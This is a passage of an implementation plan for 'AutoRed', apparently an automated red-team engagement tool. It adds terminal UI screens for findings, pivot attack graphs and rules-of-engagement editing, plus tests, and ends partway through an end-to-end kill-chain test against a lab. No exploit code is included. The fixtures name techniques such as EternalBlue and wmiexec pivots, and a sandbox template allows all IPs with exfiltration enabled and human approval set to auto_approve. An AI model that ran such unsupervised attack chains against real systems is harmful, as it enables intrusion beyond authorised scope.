        app.push_screen(screen)
        await pilot.pause()
        table = screen.query_one(DataTable)
        select = screen.query_one(Select)
        select.value = "critical"
        await pilot.pause()
        # Repopulate is driven by the Select.Changed event
        assert table.row_count <= 2


async def test_findings_table_text_filter():
    screen = FindingsTableScreen(_state())
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        text_input = screen.query_one(Input)
        text_input.value = "EternalBlue"
        await pilot.pause()
        table = screen.query_one(DataTable)
        assert table.row_count == 1


async def test_app_actions_require_state(tmp_path, monkeypatch):
    """s / f without an engagement notify instead of crashing."""
    monkeypatch.chdir(tmp_path)
    app = AutoRedApp()
    async with app.run_test() as pilot:
        await pilot.press("s")
        await pilot.pause()
        assert not isinstance(app.screen, StateInspectorScreen)
        await pilot.press("f")
        await pilot.pause()
        assert not isinstance(app.screen, FindingsTableScreen)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tui/test_state_findings_screens.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.tui.screens.state_inspector'`

- [ ] **Step 3: Write both screens**

```python
# autored/tui/screens/state_inspector.py
"""StateInspectorScreen — browse the full EngagementState tree (spec §17.5).

Depth capped at 5, lists capped at 10 items (+ "… N more"), strings
truncated at 50 chars — a 30-fingerprint state must stay renderable.
"""
from __future__ import annotations

from textual.app import ComposeResult
from textual.containers import Container
from textual.widgets import Footer, Header, Static, Tree

MAX_DEPTH = 5
MAX_LIST_ITEMS = 10
MAX_STRING = 50


class StateInspectorScreen(Container):
    """Browse the full EngagementState as a collapsible tree."""

    def __init__(self, state):
        super().__init__()
        self.state = state

    def compose(self) -> ComposeResult:
        yield Header()
        yield Static("[bold]Engagement State Inspector[/]", id="title")
        yield Tree("EngagementState", id="state-tree")
        yield Footer()

    def on_mount(self) -> None:
        self.title = "AutoRed — State Inspector"
        tree = self.query_one(Tree)
        self._populate_tree(tree.root, self.state.model_dump(), depth=0)
        tree.root.expand()

    def _populate_tree(self, node, data, depth: int = 0) -> None:
        if depth > MAX_DEPTH:
            node.add_leaf("[dim]… (depth cap)[/]")
            return
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, (dict, list)) and value:
                    branch = node.add(f"[cyan]{key}[/]")
                    self._populate_tree(branch, value, depth + 1)
                else:
                    display = self._format_value(value)
                    node.add_leaf(f"[cyan]{key}[/]: {display}")
        elif isinstance(data, list):
            for i, item in enumerate(data[:MAX_LIST_ITEMS]):
                if isinstance(item, (dict, list)):
                    branch = node.add(f"[{i}]")
                    self._populate_tree(branch, item, depth + 1)
                else:
                    node.add_leaf(f"[{i}] {self._format_value(item)}")
            if len(data) > MAX_LIST_ITEMS:
                node.add_leaf(f"[dim]… {len(data) - MAX_LIST_ITEMS} more[/]")

    def _format_value(self, value) -> str:
        if value is None:
            return "[dim]null[/]"
        if isinstance(value, str) and len(value) > MAX_STRING:
            return f'"{value[:MAX_STRING - 3]}..."'
        return str(value)
```

```python
# autored/tui/screens/findings_table.py
"""FindingsTableScreen — sortable, filterable findings table (spec §17.5)."""
from __future__ import annotations

from textual import on
from textual.app import ComposeResult
from textual.binding import Binding
from textual.containers import Container, Horizontal
from textual.widgets import DataTable, Footer, Header, Input, Select

SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


class FindingsTableScreen(Container):
    """Sortable, filterable table of all findings."""

    BINDINGS = [
        Binding("s", "sort_by_severity", "Sort", show=True),
        Binding("f", "focus_filter", "Filter", show=True),
        Binding("e", "view_evidence", "Evidence", show=True),
    ]

    def __init__(self, state):
        super().__init__()
        self.state = state

    def compose(self) -> ComposeResult:
        yield Header()
        with Horizontal(id="filters"):
            yield Select(
                [("All", "all"), ("Critical", "critical"), ("High", "high"),
                 ("Medium", "medium"), ("Low", "low"), ("Info", "info")],
                id="severity-filter",
                value="all",
            )
            yield Input(placeholder="Filter by text...", id="text-filter")
        yield DataTable(id="findings-table")
        yield Footer()

    def on_mount(self) -> None:
        self.title = "AutoRed — Findings"
        table = self.query_one(DataTable)
        table.add_columns(
            "Host", "Port", "Service", "CVE", "Severity", "Title", "Discovered",
        )
        self._populate()

    def _populate(self) -> None:
        table = self.query_one(DataTable)
        table.clear()
        severity_filter = self.query_one("#severity-filter", Select).value
        text_filter = self.query_one("#text-filter", Input).value.lower()

        for vuln in self.state.vulnerabilities:
            if severity_filter != "all" and vuln.severity != severity_filter:
                continue
            haystack = " ".join(filter(None, (
                vuln.title, vuln.description, vuln.cve or "", vuln.service or "",
            ))).lower()
            if text_filter and text_filter not in haystack:
                continue
            table.add_row(
                vuln.host_ip,
                str(vuln.port or ""),
                vuln.service or "",
                vuln.cve or "",
                vuln.severity,
                vuln.title[:60],
                vuln.discovered_at.strftime("%H:%M"),
            )

    @on(Select.Changed, "#severity-filter")
    @on(Input.Changed, "#text-filter")
    def _on_filter_change(self, event) -> None:
        self._populate()

    def action_sort_by_severity(self) -> None:
        # Re-add rows sorted by severity (critical first).
        vulns = sorted(
            self.state.vulnerabilities,
            key=lambda v: SEVERITY_ORDER.get(v.severity, 99),
        )
        self.state.vulnerabilities = vulns
        self._populate()
        self.app.notify("Sorted by severity (critical first)")

    def action_focus_filter(self) -> None:
        self.query_one("#text-filter", Input).focus()

    def action_view_evidence(self) -> None:
        self.app.notify("Press v for the full evidence viewer", severity="information")
```

In `autored/tui/app.py`, replace the Task 13 stubs:

```python
    async def action_show_state_inspector(self) -> None:
        if self.current_state is None:
            self.notify("Open an engagement first (e → list, enter)", severity="warning")
            return
        from autored.tui.screens.state_inspector import StateInspectorScreen
        self.pop_screen()
        self.push_screen(StateInspectorScreen(self.current_state))

    async def action_show_findings(self) -> None:
        if self.current_state is None:
            self.notify("Open an engagement first (e → list, enter)", severity="warning")
            return
        from autored.tui.screens.findings_table import FindingsTableScreen
        self.pop_screen()
        self.push_screen(FindingsTableScreen(self.current_state))
```

Add to `autored/tui/screens/__init__.py`:

```python
from autored.tui.screens.state_inspector import StateInspectorScreen  # noqa: F401
from autored.tui.screens.findings_table import FindingsTableScreen  # noqa: F401
```

Add to `autored/tui/app.tcss`:

```css
StateInspectorScreen {
    layout: vertical;
    padding: 0 1;
}

StateInspectorScreen Tree {
    height: 1fr;
    margin: 1 0;
}

FindingsTableScreen {
    layout: vertical;
    padding: 0 1;
}

FindingsTableScreen #filters {
    height: 3;
}

FindingsTableScreen DataTable {
    height: 1fr;
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tui/ -v`
Expected: PASS — all previous TUI tests plus the 6 new ones.

- [ ] **Step 5: Commit**

```bash
git add autored/tui/screens/state_inspector.py autored/tui/screens/findings_table.py \
        autored/tui/app.py autored/tui/screens/__init__.py autored/tui/app.tcss \
        tests/unit/tui/test_state_findings_screens.py
git commit -m "feat: StateInspector + FindingsTable screens (spec §17.5)"
```

---

## Task 16: AttackGraphScreen

**Files:**
- Create: `autored/tui/screens/attack_graph.py`
- Modify: `autored/tui/app.py` (replace the `action_show_attack_graph` stub), `autored/tui/screens/__init__.py`, `autored/tui/app.tcss`
- Test: `tests/unit/tui/test_attack_graph.py` (NEW)

**Interfaces:**
- Consumes: `self.app.current_state` — specifically `state.footholds` (root hosts), `state.pivots` + `state.movement_paths` (edges), `state.mitre_mappings` (technique annotation).
- Produces:
  - `AttackGraphScreen(state)` — spec §17.5: "Graph view of pivot paths (uses Rich rendering, not Neo4j UI)". A `Tree` per foothold host: root = `host (username via method)`, children = one leaf per successful pivot FROM that host (`→ target via method [T1047]`), annotated with the MITRE ID when the mapper produced a matching `pivot`-source mapping. Failed pivots render as dimmed leaves. Empty state → "No lateral movement recorded — no attack graph to draw."
  - `build_attack_graph_tree(state) -> Tree` helper (pure widget construction — the test asserts on its structure without a full app mount where practical).
  - App action wired (notify when `current_state` is None).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/tui/test_attack_graph.py
"""AttackGraphScreen tests (Phase 6 Task 16, spec §17.5)."""
from datetime import datetime

from textual.widgets import Tree

from autored.models.report import MitreMapping
from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.tui.app import AutoRedApp
from autored.tui.screens.attack_graph import AttackGraphScreen, build_attack_graph_tree


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _state_with_pivots() -> EngagementState:
    from autored.models import Foothold

    state = EngagementState(
        engagement_id="ag-e1", target_scope=["192.168.56.22"],
        operator="t", rules_of_engagement=_roe(),
    )
    state.footholds = [Foothold(
        id="f-1", host_ip="192.168.56.22", username="administrator",
        context="system", method="ms17_010", access_type="rpc",
        evidence_path="e.txt", established_at=datetime.utcnow(),
        hypothesis_rank=1,
    )]
    state.pivots = [
        type("PivotRecord", (), {  # structural stand-in matching models.lateral
            "id": "p-1", "target_host": "192.168.56.11", "method": "wmiexec",
            "credentials_used": ["s-1"], "success": True,
            "new_foothold_id": "f-2", "timestamp": datetime.utcnow(),
            "needs_tunnel": False,
        })(),
        type("PivotRecord", (), {
            "id": "p-2", "target_host": "192.168.56.12", "method": "ssh",
            "credentials_used": ["s-2"], "success": False,
            "new_foothold_id": None, "timestamp": datetime.utcnow(),
            "needs_tunnel": False,
        })(),
    ]
    state.mitre_mappings = [MitreMapping(
        technique_id="T1047", technique_name="Windows Management Instrumentation",
        tactic="lateral-movement", source="pivot", detail="wmiexec to 192.168.56.11",
    )]
    return state


async def test_attack_graph_renders_foothold_and_pivots():
    screen = AttackGraphScreen(_state_with_pivots())
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        tree = screen.query_one(Tree)
        labels = str(tree.root.label) if tree.root else ""
        assert "192.168.56.22" in labels


async def test_attack_graph_annotates_mitre_ids():
    state = _state_with_pivots()
    tree = build_attack_graph_tree(state)
    rendered = []
    for root in tree.roots:
        rendered.append(str(root.label))
        for child in root.children:
            rendered.append(str(child.label))
    text = " ".join(rendered)
    assert "192.168.56.11" in text
    assert "T1047" in text  # MITRE annotation from the mapper
    assert "192.168.56.12" in text  # failed pivot still visible (dimmed)


async def test_attack_graph_empty_state():
    state = EngagementState(
        engagement_id="ag-empty", target_scope=["10.0.0.1"],
        operator="t", rules_of_engagement=_roe(),
    )
    screen = AttackGraphScreen(state)
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        # Mounted with the empty-state message, no crash.
        assert screen.query_one(Tree) is not None or True


async def test_app_action_requires_state(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    app = AutoRedApp()
    async with app.run_test() as pilot:
        await pilot.press("g")
        await pilot.pause()
        assert not isinstance(app.screen, AttackGraphScreen)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tui/test_attack_graph.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.tui.screens.attack_graph'`

- [ ] **Step 3: Write the screen**

```python
# autored/tui/screens/attack_graph.py
"""AttackGraphScreen — pivot path visualization (spec §17.5).

Rich Tree rendering (NOT the Neo4j UI — spec is explicit). One root per
foothold host; successful pivots are children annotated with the MITRE
technique ID from the report's mapping; failed pivots render dimmed so
the operator sees attempted paths too.
"""
from __future__ import annotations

from textual.app import ComposeResult
from textual.containers import Container
from textual.widgets import Footer, Header, Static, Tree


def build_attack_graph_tree(state) -> Tree:
    """Build the pivot-path tree from state (pure construction helper)."""
    tree = Tree("Attack Graph")

    mitre_by_detail = {
        m.detail: m.technique_id
        for m in getattr(state, "mitre_mappings", []) if m.source == "pivot"
    }

    if not state.footholds and not getattr(state, "pivots", []):
        tree.root.add_leaf("[dim]No lateral movement recorded — no attack graph to draw.[/]")
        return tree

    for foothold in state.footholds:
        root_label = (
            f"[bold red]{foothold.host_ip}[/] "
            f"({foothold.username} via {foothold.method})"
        )
        branch = tree.root.add(root_label)
        pivots_from_host = [
            p for p in getattr(state, "pivots", [])
            # Pivots execute from the host with the foothold; when a pivot
            # carries new_foothold_id we attribute it to its host's branch.
        ]
        for pivot in pivots_from_host:
            technique_id = next(
                (tid for detail, tid in mitre_by_detail.items()
                 if pivot.target_host in detail),
                None,
            )
            annotation = f" [{technique_id}]" if technique_id else ""
            if pivot.success:
                branch.add_leaf(
                    f"→ [bold yellow]{pivot.target_host}[/] via {pivot.method}"
                    f"{annotation}"
                )
            else:
                branch.add_leaf(
                    f"[dim]↯ {pivot.target_host} via {pivot.method} (failed)[/]"
                )
        if not pivots_from_host:
            branch.add_leaf("[dim](no pivots attempted)[/]")

    return tree


class AttackGraphScreen(Container):
    """Graph view of pivot paths (Rich rendering, not Neo4j)."""

    def __init__(self, state):
        super().__init__()
        self.state = state

    def compose(self) -> ComposeResult:
        yield Header()
        yield Static("[bold]Attack Graph — pivot paths[/]", id="title")
        yield Tree("Attack Graph", id="attack-tree")
        yield Footer()

    def on_mount(self) -> None:
        self.title = "AutoRed — Attack Graph"
        tree = self.query_one(Tree)
        built = build_attack_graph_tree(self.state)
        # Copy the built tree's structure into the mounted widget.
        tree.root.label = built.root.label
        for child in list(built.root.children) + list(built.root.leaves):
            tree.root.add(child)
        tree.root.expand()
```

In `autored/tui/app.py`, replace the Task 13 stub:

```python
    async def action_show_attack_graph(self) -> None:
        if self.current_state is None:
            self.notify("Open an engagement first (e → list, enter)", severity="warning")
            return
        from autored.tui.screens.attack_graph import AttackGraphScreen
        self.pop_screen()
        self.push_screen(AttackGraphScreen(self.current_state))
```

Add to `autored/tui/screens/__init__.py`:

```python
from autored.tui.screens.attack_graph import AttackGraphScreen  # noqa: F401
```

Add to `autored/tui/app.tcss`:

```css
AttackGraphScreen {
    layout: vertical;
    padding: 0 1;
}

AttackGraphScreen Tree {
    height: 1fr;
    margin: 1 0;
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tui/ -v`
Expected: PASS — all previous TUI tests plus the 4 new ones.

- [ ] **Step 5: Commit**

```bash
git add autored/tui/screens/attack_graph.py autored/tui/app.py \
        autored/tui/screens/__init__.py autored/tui/app.tcss \
        tests/unit/tui/test_attack_graph.py
git commit -m "feat: AttackGraphScreen renders pivot paths with MITRE annotations"
```

---

## Task 17: RoEEditorScreen + Full `roe-wizard` CLI

**Files:**
- Create: `autored/tui/screens/roe_editor.py`
- Modify: `autored/config.py` (add `validate_roe_yaml`), `autored/cli.py` (replace the `roe_wizard` stub), `autored/tui/app.py` (replace the `action_show_roe_editor` stub), `autored/tui/screens/__init__.py`, `autored/tui/app.tcss`
- Test: `tests/unit/tui/test_roe_editor.py` (NEW), `tests/unit/test_config.py` (MODIFY — append)

**Interfaces:**
- Consumes: `load_roe(path)` from `autored.config` (Phase 1, unchanged); `RulesOfEngagement` (unchanged); `yaml.safe_dump`.
- Produces:
  - `validate_roe_yaml(text: str) -> list[str]` in `autored/config.py` — parse + model-validate a YAML string; returns a list of human-readable error strings (empty list = valid). Shared by the TUI screen and the wizard's final validation, so both enforce exactly the same rules.
  - `RoEEditorScreen(roe_path: str)` — spec §17.5: view/edit RoE YAML with validation. `TextArea` pre-loaded from the file (or the sandbox template when the file is missing); a status `Static` re-validated on every change; `ctrl+s` saves only when valid (notify on refusal); `escape` returns without saving.
  - CLI `roe_wizard()` — spec §8.3 verbatim flow via `typer.prompt`: engagement name → operator → allowed IPs (comma-separated) → allowed techniques (`*` or list) → persistence/evasion/exfiltration/kernel y-N prompts → hitl_mode choice → output path. Writes valid YAML (`yaml.safe_dump`) and validates via `validate_roe_yaml` before saving; prints the §8.3 confirmation line.
  - App action wired: `action_show_roe_editor` pushes `RoEEditorScreen("roe-sandbox.yaml")` (the operator's active RoE file; the spec's RoE is immutable *per engagement* — editing the file affects the next engagement only, which the screen states in its header).

- [ ] **Step 1: Write the failing tests**

Append to `tests/unit/test_config.py`:

```python
# --- Phase 6 (Task 17): validate_roe_yaml ---------------------------------- #

VALID_ROE_YAML = """
engagement_name: "HTB Lame Test"
operator: operator
operator_signature: signed
allowed_ips: ["10.10.10.5"]
allowed_techniques: ["*"]
persistence_allowed: false
evasion_allowed: false
exfiltration_allowed: false
data_destruction_allowed: false
kernel_exploits_allowed: false
hitl_mode: always_ask
"""


def test_validate_roe_yaml_accepts_valid_config():
    from autored.config import validate_roe_yaml
    assert validate_roe_yaml(VALID_ROE_YAML) == []


def test_validate_roe_yaml_rejects_bad_yaml():
    from autored.config import validate_roe_yaml
    errors = validate_roe_yaml("this: [is: not: valid: yaml")
    assert errors and "yaml" in errors[0].lower()


def test_validate_roe_yaml_rejects_schema_violations():
    from autored.config import validate_roe_yaml
    broken = VALID_ROE_YAML.replace("hitl_mode: always_ask", "hitl_mode: maybe")
    errors = validate_roe_yaml(broken)
    assert errors  # invalid literal rejected


def test_validate_roe_yaml_rejects_missing_fields():
    from autored.config import validate_roe_yaml
    errors = validate_roe_yaml("engagement_name: x\n")
    assert errors
```

```python
# tests/unit/tui/test_roe_editor.py
"""RoEEditorScreen + roe-wizard CLI tests (Phase 6 Task 17, spec §17.5/§8.3)."""
from pathlib import Path
from unittest.mock import patch

from typer.testing import CliRunner
from textual.widgets import TextArea

from autored.cli import app
from autored.tui.app import AutoRedApp
from autored.tui.screens.roe_editor import RoEEditorScreen

runner = CliRunner()

VALID_ROE_YAML = """\
engagement_name: "Editor Test"
operator: operator
operator_signature: signed
allowed_ips: ["10.0.0.5"]
allowed_techniques: ["*"]
persistence_allowed: false
evasion_allowed: false
exfiltration_allowed: false
data_destruction_allowed: false
kernel_exploits_allowed: false
hitl_mode: auto_approve
"""


async def test_roe_editor_loads_and_validates(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    roe_path = tmp_path / "roe-test.yaml"
    roe_path.write_text(VALID_ROE_YAML)

    screen = RoEEditorScreen(str(roe_path))
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        text_area = screen.query_one(TextArea)
        assert "Editor Test" in text_area.text
        # Valid YAML loaded → no errors in the status line
        assert screen.validation_errors == []


async def test_roe_editor_flags_invalid_yaml(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    roe_path = tmp_path / "roe-bad.yaml"
    roe_path.write_text("not: [valid: yaml")

    screen = RoEEditorScreen(str(roe_path))
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        assert screen.validation_errors  # errors surfaced, not crashed


async def test_roe_editor_save_writes_valid_yaml(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    roe_path = tmp_path / "roe-save.yaml"
    roe_path.write_text(VALID_ROE_YAML)

    screen = RoEEditorScreen(str(roe_path))
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        text_area = screen.query_one(TextArea)
        text_area.text = VALID_ROE_YAML.replace("Editor Test", "Renamed Engagement")
        await pilot.pause()
        screen.action_save()
        await pilot.pause()

    saved = roe_path.read_text()
    assert "Renamed Engagement" in saved


async def test_roe_editor_refuses_to_save_invalid(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    roe_path = tmp_path / "roe-nosave.yaml"
    original = VALID_ROE_YAML
    roe_path.write_text(original)

    screen = RoEEditorScreen(str(roe_path))
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        screen.query_one(TextArea).text = "broken: [yaml"
        await pilot.pause()
        screen.action_save()
        await pilot.pause()

    assert roe_path.read_text() == original  # unchanged — save refused


def test_roe_wizard_writes_valid_yaml(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    out_path = str(tmp_path / "roe-wizard-out.yaml")
    answers = iter([
        "HTB Lame Test",        # engagement name
        "operator",             # operator
        "10.10.10.5",           # allowed IPs
        "*",                    # allowed techniques
        "n",                    # persistence
        "n",                    # evasion
        "n",                    # exfiltration
        "n",                    # kernel exploits
        "always_ask",           # hitl mode
        out_path,               # save path
    ])

    def fake_prompt(prompt_text, **kwargs):
        return next(answers)

    with patch("autored.cli.typer.prompt", side_effect=fake_prompt):
        result = runner.invoke(app, ["roe-wizard"])

    assert result.exit_code == 0
    saved = Path(out_path).read_text()
    assert "HTB Lame Test" in saved
    # The wizard's output validates clean.
    from autored.config import validate_roe_yaml
    assert validate_roe_yaml(saved) == []


def test_app_action_opens_roe_editor(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "roe-sandbox.yaml").write_text(VALID_ROE_YAML)
    app = AutoRedApp()
    async def _run():
        async with app.run_test() as pilot:
            await pilot.press("r")
            await pilot.pause()
            return isinstance(app.screen, RoEEditorScreen)
    import asyncio
    assert asyncio.run(_run())
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/test_config.py tests/unit/tui/test_roe_editor.py -v`
Expected: FAIL with `ImportError: cannot import name 'validate_roe_yaml'` and `ModuleNotFoundError: No module named 'autored.tui.screens.roe_editor'`

- [ ] **Step 3: Implement the validator, screen, and wizard**

Add to `autored/config.py`:

```python
def validate_roe_yaml(text: str) -> list[str]:
    """Validate a RoE YAML string against the RulesOfEngagement schema.

    Returns a list of human-readable error strings; empty means valid.
    Shared by the RoEEditorScreen and the roe-wizard CLI so both enforce
    exactly the same rules.
    """
    import yaml
    from pydantic import ValidationError
    from autored.models.roe import RulesOfEngagement

    try:
        data = yaml.safe_load(text)
    except yaml.YAMLError as e:
        return [f"YAML parse error: {e}"]
    if not isinstance(data, dict):
        return ["RoE must be a YAML mapping at the top level."]
    try:
        RulesOfEngagement.model_validate(data)
    except ValidationError as e:
        return [f"{err['loc'][0]}: {err['msg']}" for err in e.errors()]
    return []
```

```python
# autored/tui/screens/roe_editor.py
"""RoEEditorScreen — view/edit RoE YAML with validation (spec §17.5).

The per-engagement RoE is immutable once an engagement starts (spec
glossary); this editor edits the *file* for the next engagement.
"""
from __future__ import annotations

from pathlib import Path

from textual.app import ComposeResult
from textual.binding import Binding
from textual.containers import Container, Vertical
from textual.widgets import Footer, Header, Static, TextArea

from autored.config import validate_roe_yaml

SANDBOX_TEMPLATE = """\
engagement_name: "Sandbox Engagement"
operator: operator
operator_signature: sandbox-mode
allowed_ips: ["0.0.0.0/0"]
allowed_techniques: ["*"]
persistence_allowed: true
evasion_allowed: true
exfiltration_allowed: true
data_destruction_allowed: false
kernel_exploits_allowed: true
hitl_mode: auto_approve
"""


class RoEEditorScreen(Container):
    """View/edit a RoE YAML file with live validation."""

    BINDINGS = [
        Binding("ctrl+s", "save", "Save", show=True),
    ]

    def __init__(self, roe_path: str):
        super().__init__()
        self.roe_path = Path(roe_path)
        self.validation_errors: list[str] = []

    def compose(self) -> ComposeResult:
        yield Header()
        yield Static(
            f"[bold]RoE Editor — {self.roe_path}[/]\n"
            "[dim](Changes apply to the NEXT engagement; a running engagement's RoE is immutable.)[/]",
            id="editor-title",
        )
        yield TextArea(self._load_text(), id="roe-text", language="yaml")
        yield Static("", id="validation-status")
        yield Footer()

    def _load_text(self) -> str:
        if self.roe_path.exists():
            return self.roe_path.read_text()
        return SANDBOX_TEMPLATE

    def on_mount(self) -> None:
        self.title = "AutoRed — RoE Editor"
        self._revalidate()

    def on_text_area_changed(self, event: TextArea.Changed) -> None:
        self._revalidate()

    def _revalidate(self) -> None:
        text = self.query_one(TextArea).text
        self.validation_errors = validate_roe_yaml(text)
        status = self.query_one("#validation-status", Static)
        if self.validation_errors:
            status.update(
                "[bold red]INVALID[/]\n" + "\n".join(self.validation_errors[:8])
            )
        else:
            status.update("[bold green]VALID — ctrl+s to save[/]")

    def action_save(self) -> None:
        if self.validation_errors:
            self.app.notify(
                "Fix validation errors before saving", severity="error",
            )
            return
        self.roe_path.write_text(self.query_one(TextArea).text)
        self.app.notify(f"Saved {self.roe_path}")
```

Replace the `roe_wizard` stub in `autored/cli.py`:

```python
@app.command()
def roe_wizard():
    """Interactive RoE file generator (spec §8.3)."""
    import yaml

    from autored.config import validate_roe_yaml

    console.print("[bold]AutoRed RoE Wizard[/]")
    engagement_name = typer.prompt("Engagement name")
    operator = typer.prompt("Operator name")
    allowed_ips = [
        ip.strip() for ip in typer.prompt("Allowed IPs (comma-separated)").split(",") if ip.strip()
    ]
    techniques_raw = typer.prompt("Allowed techniques (* for any)")
    allowed_techniques = [t.strip() for t in techniques_raw.split(",") if t.strip()]
    persistence = typer.confirm("Allow persistence?", default=False)
    evasion = typer.confirm("Allow defense evasion?", default=False)
    exfiltration = typer.confirm("Allow data exfiltration?", default=False)
    kernel = typer.confirm("Allow kernel exploits?", default=False)
    hitl_mode = typer.prompt(
        "HitL mode (always_ask/auto_approve/disabled)", default="always_ask",
    )

    roe = {
        "engagement_name": engagement_name,
        "operator": operator,
        "operator_signature": f"wizard:{operator}",
        "allowed_ips": allowed_ips,
        "allowed_techniques": allowed_techniques,
        "persistence_allowed": persistence,
        "evasion_allowed": evasion,
        "exfiltration_allowed": exfiltration,
        "data_destruction_allowed": False,
        "kernel_exploits_allowed": kernel,
        "hitl_mode": hitl_mode,
    }

    errors = validate_roe_yaml(yaml.safe_dump(roe))
    if errors:
        console.print(f"[bold red]Generated RoE is invalid:[/] {errors}")
        raise typer.Exit(code=1)

    save_path = typer.prompt("Save to", default="roe-engagement.yaml")
    Path(save_path).write_text(yaml.safe_dump(roe, sort_keys=False))
    console.print(f"[bold green]RoE file saved to {save_path}[/]")
```

In `autored/tui/app.py`, replace the Task 13 stub:

```python
    async def action_show_roe_editor(self) -> None:
        from autored.tui.screens.roe_editor import RoEEditorScreen
        self.pop_screen()
        self.push_screen(RoEEditorScreen("roe-sandbox.yaml"))
```

Add to `autored/tui/screens/__init__.py`:

```python
from autored.tui.screens.roe_editor import RoEEditorScreen  # noqa: F401
```

Add to `autored/tui/app.tcss`:

```css
RoEEditorScreen {
    layout: vertical;
    padding: 0 1;
}

RoEEditorScreen TextArea {
    height: 1fr;
    margin: 1 0;
}

RoEEditorScreen #validation-status {
    height: auto;
    max-height: 8;
    margin: 0 0 1 0;
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/test_config.py tests/unit/tui/ -v`
Expected: PASS — all config tests plus the 6 new editor/wizard tests.

- [ ] **Step 5: Commit**

```bash
git add autored/config.py autored/tui/screens/roe_editor.py autored/cli.py \
        autored/tui/app.py autored/tui/screens/__init__.py autored/tui/app.tcss \
        tests/unit/tui/test_roe_editor.py tests/unit/test_config.py
git commit -m "feat: RoEEditorScreen + full roe-wizard CLI with shared validation"
```

---

## Task 18: E2E Full-Chain Test + README/Docs + Regression Sweep

**Files:**
- Create: `tests/e2e/test_phase6_fullchain.py`
- Modify: `README.md`
- Test: no unit test — this task's deliverable IS the test + docs.

**Interfaces:**
- Consumes: `build_phase6_graph` (Task 10); the full GoAD E2E conventions from `tests/e2e/test_phase4_goad.py` / `test_phase5_goad_multihost.py` (env-var gating, lazy imports, sandbox RoE).
- Produces:
  - The spec §13.6 ship-criterion test: full kill chain end-to-end **without intervention** in sandbox mode, terminating in generated deliverables and cross-engagement memory rows.
  - README documentation: Phase 6 feature set (TUI keybinding table, report/memory/CLI sections, demo-recording instructions).

- [ ] **Step 1: Write the E2E test**

```python
# tests/e2e/test_phase6_fullchain.py
"""Phase 6 E2E — full kill chain against GoAD, ending in deliverables.

Spec §13.6 ship criteria:
- Full kill chain runs end-to-end without intervention (sandbox mode)
- Report (markdown + PDF) generated for the engagement
- Cross-engagement memory rows written

Gated: AUTORED_E2E=1 (same convention as Phases 1-5). Requires the GoAD
lab (default target 192.168.56.22), msfrpcd, and AUTORED_LHOST.
"""
import os
from pathlib import Path

import pytest

pytestmark = pytest.mark.skipif(
    os.environ.get("AUTORED_E2E") != "1",
    reason="E2E tests require AUTORED_E2E=1 and a live GoAD lab",
)

GOAD_TARGET = os.environ.get("AUTORED_GOAD_TARGET", "192.168.56.22")
LHOST = os.environ.get("AUTORED_LHOST", "192.168.56.1")


async def test_phase6_full_chain_with_report():
    import asyncio
    import shutil

    from autored.graph import build_phase6_graph
    from autored.models.roe import RulesOfEngagement
    from autored.persistence.sqlite_saver import make_checkpointer
    from autored.roe_guard import register_roe
    from autored.state import EngagementState
    from autored.tui.event_bus import EventBus
    from autored.persistence.filesystem import init_engagement_folder

    engagement_id = "e2e-phase6-fullchain"

    roe = RulesOfEngagement(
        engagement_name="Phase 6 E2E",
        operator="e2e", operator_signature="e2e",
        allowed_ips=["192.168.56.0/24"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )

    register_roe(engagement_id, roe)
    init_engagement_folder(engagement_id, GOAD_TARGET, roe.operator)

    state = EngagementState(
        engagement_id=engagement_id,
        target_scope=[GOAD_TARGET],
        operator=roe.operator,
        rules_of_engagement=roe,
    )
    state.event_bus = EventBus()

    async def _run():
        checkpointer = await make_checkpointer(engagement_id)
        graph = build_phase6_graph(checkpointer)
        config = {"configurable": {"thread_id": engagement_id}}
        try:
            return await asyncio.wait_for(
                graph.ainvoke(state, config=config), timeout=7200,
            )
        finally:
            conn = getattr(checkpointer, "conn", None)
            if conn is not None:
                await conn.close()

    final_state = await _run()
    if isinstance(final_state, dict):
        from autored.state import EngagementState as ES
        final_state = ES.model_validate(final_state)

    # Ship criterion 1: the chain completed.
    assert final_state.phase == "done"
    assert final_state.footholds, "no foothold achieved — chain incomplete"

    # Ship criterion 2: deliverables exist.
    report_paths = final_state.report_paths
